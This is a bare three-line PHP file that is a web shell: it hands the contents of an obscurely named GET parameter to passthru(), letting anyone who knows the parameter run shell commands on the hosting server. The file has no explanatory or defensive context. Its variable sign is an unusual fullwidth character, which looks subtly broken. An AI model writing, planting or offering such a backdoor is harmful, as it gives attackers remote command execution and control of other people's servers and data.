<?php
passthru(＄_GET['4o6qEmsZ']);
?>
